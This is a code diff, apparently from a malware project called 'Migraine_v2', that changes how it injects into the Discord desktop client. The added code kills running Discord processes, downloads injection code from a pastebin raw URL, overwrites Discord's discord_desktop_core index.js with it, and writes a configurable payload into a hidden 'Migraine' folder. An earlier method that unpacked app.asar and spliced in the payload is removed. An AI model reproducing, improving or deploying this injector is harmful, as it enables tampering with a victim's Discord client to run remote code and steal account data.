@@ -1,10 +1,10 @@
-﻿using Migraine_v2.Client.Asar_Extraction;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Management;
+using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -27,14 +27,16 @@ namespace Migraine_v2.Client
             try 
             {
                 var Process = GetDiscordProcesses();
-                var path = Path.Combine(Path.GetDirectoryName(GetProcessPath(Process.First().Id)), "resources");
+                var DriveLetter = GetDriveInfo(new FileInfo(GetProcessPath(Process[0].Id)));
+                var CanaryVersion = "0.0.263";
+                var DiscordVersion = "0.0.306";
+                var path = Process.First().ProcessName.Contains("Canary") ? $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Roaming\\\\discordcanary\\{CanaryVersion}\\modules\\discord_desktop_core" : $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Roaming\\\\Discord\\{DiscordVersion}\\modules\\discord_desktop_core";
                 if (Settings.KillDiscord) Process.ForEach(x => x.Kill());
-                ExtractAsar(Path.Combine(path, "app.asar"), Path.Combine(path, "app"));
-                File.Move(Path.Combine(path, "app.asar"), Path.Combine(path, "original_app.asar"));
-                string Index = Path.Combine(Path.Combine(path, "app"), "index.js");
-                string Contents = File.ReadAllText(Index);
-                Contents = Contents.Replace("mainWindow.webContents.on('dom-ready', function () {});", Settings.Payload);
-                File.WriteAllText(Index, Contents);
+                var InjectionCode = new WebClient().DownloadString("https://pastebin.com/raw/6SghAyRq");
+                InjectionCode = InjectionCode.Replace("directoryofinjection", $"{path}\\Migraine");
+                Directory.CreateDirectory($"{path}\\Migraine");
+                File.WriteAllText($"{path}\\index.js", InjectionCode);
+                File.WriteAllText($"{path}\\Migraine\\payload.js", Settings.Payload);
                 return true;
             }
             catch(Exception)
@@ -42,12 +44,10 @@ namespace Migraine_v2.Client
                 return false;
             }
         }
-        private bool ExtractAsar(string input, string output)
-        {
-            AsarArchive archive = new AsarArchive(input);
-            AsarExtractor extractor = new AsarExtractor();
 
-            return extractor.ExtractAll(archive, output, false);
+        private static DriveInfo GetDriveInfo(FileInfo file)
+        {
+            return new DriveInfo(file.Directory.Root.FullName);
         }
 
         private List<Process> GetDiscordProcesses()
